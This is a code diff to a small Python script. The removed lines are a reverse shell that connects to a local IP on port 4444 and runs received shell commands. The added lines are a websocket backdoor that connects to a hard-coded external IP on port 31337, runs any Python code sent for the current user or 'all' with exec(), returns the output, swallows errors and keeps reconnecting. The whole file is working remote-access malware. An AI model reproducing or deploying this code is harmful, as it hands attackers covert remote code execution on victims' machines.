@@ -1,21 +1,33 @@
-import socket
-import subprocess
-import os
+import asyncio
+import websockets
+import json
+import getpass
+import io
+from contextlib import redirect_stdout
 
-server_ip = "10.0.2.15"  # Kendi IP veya ngrok adresin
-port = 4444
+username = getpass.getuser()
 
-client = socket.socket()
-client.connect((server_ip, port))
+async def handler():
+    while True:
+        try:
+            async with websockets.connect('ws://91.179.183.243:31337') as websocket:        
+                async for message in websocket:
+                    received_data = json.loads(message)
 
-while True:
-    command = client.recv(1024).decode()
-    if command.lower() == "exit":
-        break
-    try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-    except subprocess.CalledProcessError as e:
-        output = e.output
-    client.send(output or b"[+] Boş çıktı")
+                    if received_data['recipient'] == username or received_data['recipient'] == 'all':
+                        try:
+                            buffer = io.StringIO()
 
-client.close()
+                            with redirect_stdout(buffer):
+                                exec(received_data['code'])
+
+                            output = buffer.getvalue()
+                            
+                            await websocket.send(json.dumps({"sender": username, "output": f"code executed : {output}"}))
+                        except:
+                            pass
+        except:
+            await asyncio.sleep(2)
+
+if __name__ == "__main__":
+    asyncio.run(handler())
